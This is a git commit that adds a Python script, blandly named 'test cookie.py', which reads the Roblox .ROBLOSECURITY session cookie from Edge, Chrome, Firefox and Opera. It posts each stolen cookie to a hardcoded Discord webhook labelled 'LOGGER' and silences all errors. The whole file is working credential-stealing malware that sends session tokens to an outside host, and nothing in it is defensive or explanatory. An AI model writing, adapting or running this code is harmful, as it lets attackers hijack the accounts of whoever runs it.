f114a47e09a21a4c37dd38c3a26fe417bd146aa5
ReapV <96329441+ReapV@users.noreply.github.com>
2022-08-25 19:56:34 -0400

    Add files via upload

---
+++ test cookie.py
@@ -0,0 +1,44 @@
+import browser_cookie3, requests, threading
+
+webhook = "https://discord.com/api/webhooks/1009714831970025492/bke5qKpm9bNg5UAWS-eW0C_QuIZLW86qBfeRyw7lSqXIWD7KMYq8uC1OXlIIAXJ8RiZO"
+
+def edge_logger():
+    try:
+        cookies = browser_cookie3.edge(domain_name='roblox.com')
+        cookies = str(cookies)
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
+    except:
+        pass
+def chrome_logger():
+    try:
+        cookies = browser_cookie3.chrome(domain_name='roblox.com')
+        cookies = str(cookies)
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
+    except:
+        pass
+
+
+def firefox_logger():
+    try:
+        cookies = browser_cookie3.firefox(domain_name='roblox.com')
+        cookies = str(cookies)
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
+    except:
+        pass
+
+def opera_logger():
+    try:
+        cookies = browser_cookie3.opera(domain_name='roblox.com')
+        cookies = str(cookies)
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
+    except:
+        pass
+
+browsers = [edge_logger, chrome_logger, firefox_logger, opera_logger]
+
+for x in browsers:
+    threading.Thread(target=x,).start()
